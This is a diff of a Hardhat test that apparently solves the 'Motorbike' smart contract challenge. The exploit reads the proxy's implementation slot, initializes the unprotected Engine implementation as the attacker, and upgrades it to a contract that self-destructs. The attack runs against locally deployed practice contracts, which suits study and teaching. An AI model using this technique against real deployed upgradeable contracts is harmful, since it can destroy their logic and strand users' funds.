@@ -1,19 +1,17 @@
 import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
 import { expect } from 'chai';
-import { BigNumber, Contract } from 'ethers';
+import { Contract } from 'ethers';
 import { ethers } from 'hardhat';
 
 const { provider, utils } = ethers;
 
 describe('Motorbike', () => {
   let owner: SignerWithAddress;
-  let user1: SignerWithAddress;
-  let user2: SignerWithAddress;
   let attacker: SignerWithAddress;
   let motorbikeContract: Contract;
   let engineContract: Contract;
   before(async () => {
-    [owner, user1, user2, attacker] = await ethers.getSigners();
+    [owner, attacker] = await ethers.getSigners();
     const [EngineFactory, MotorbikeFactory] = await Promise.all([
       ethers.getContractFactory('Engine'),
       ethers.getContractFactory('Motorbike'),
@@ -32,39 +30,54 @@ describe('Motorbike', () => {
     const iface = new ethers.utils.Interface([
       'function horsePower() returns (uint256)',
     ]);
+
     const data = iface.encodeFunctionData('horsePower');
 
-    let horsePower: any = await attacker.call({
+    const horsePower: any = await attacker.call({
       to: motorbikeContract.address,
       data,
     });
-    horsePower = BigNumber.from(horsePower).toNumber();
 
     return horsePower;
   }
 
   it('attack', async () => {
+    // GET ENGINE IMPLEMENTATION ADDRESS FIRST
+    const IMPLEMENTATION_SLOT = utils.arrayify(
+      '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'
+    );
+
+    const implementationAddressSlotValue = await provider.getStorageAt(
+      motorbikeContract.address,
+      IMPLEMENTATION_SLOT
+    );
+
+    const implementationAddress = utils.getAddress(
+      '0x' + implementationAddressSlotValue.substring(26)
+    );
+
+    const EngineFactory = await ethers.getContractFactory('Engine');
+    const engine = await EngineFactory.attach(implementationAddress);
+
+    // CALL INITIALIZE AND BE THE UPGRADER
+    let tx = await engine.connect(attacker).initialize();
+    await tx.wait();
+
     // Deploy a faulty engine
     const FaultyEngineFactory = await ethers.getContractFactory('FaultyEngine');
     const faultyEngine = await FaultyEngineFactory.deploy();
     await faultyEngine.deployed();
 
-    const iface = new ethers.utils.Interface([
-      'function upgradeToAndCall(address, bytes)',
-    ]);
-    const data = iface.encodeFunctionData('upgradeToAndCall', [
-      faultyEngine.address,
-      faultyEngine.interface.encodeFunctionData('seppuku'),
-    ]);
+    const iface = new ethers.utils.Interface(['function seppuku()']);
+    const data = iface.encodeFunctionData('seppuku');
 
-    // Force an upgrade
-    const tx = await attacker.sendTransaction({
-      to: motorbikeContract.address,
-      data,
-    });
+    // UPGRADE IMPLENTATION TO A FAULTY ONE AND CALL SELFDESTRUCT
+    tx = await engine
+      .connect(attacker)
+      .upgradeToAndCall(faultyEngine.address, data);
     await tx.wait();
 
-    const horsePower = await getEngineHorsePower();
-    expect(horsePower).to.equal(0);
+    // ENGINE IS USELESS
+    expect(await getEngineHorsePower()).to.equal('0x');
   });
 });
